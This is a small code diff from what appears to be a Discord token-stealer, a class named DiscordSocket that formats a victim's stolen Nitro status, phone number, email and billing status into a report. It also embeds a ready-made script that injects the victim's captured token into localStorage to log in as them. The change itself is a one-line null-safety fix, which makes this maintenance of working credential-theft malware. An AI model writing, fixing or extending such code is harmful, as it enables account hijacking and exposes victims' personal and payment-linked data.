@@ -125,7 +125,7 @@ export class DiscordSocket {
         { name: "Nitro:", value: `${getUser.premium_type ? (getUser.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}`, inline: true },
         { name: "Phone:", value: `${getUser.phone ? getUser.phone : "None"}`, inline: true },
         { name: "Email:", value: `${getUser.email}`, inline: true },
-        { name: "Billing:", value: `${getBilling.length > 0 ? 'Yes' : 'No'}`, inline: true },
+        { name: "Billing:", value: `${getBilling?.length > 0 ? 'Yes' : 'No'}`, inline: true },
         { name: "Code to login", value: `\`\`\`js\n` + `function login(token) {\n` + `  setInterval(() => {\n` + `   document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`\n` + `  }, 50);\n` + `  setTimeout(() => {\n` + `    location.reload();\n` + `  }, 2500);\n` + `}\n\n` + `login('${token}')` + `\`\`\`` },
       ]);
 
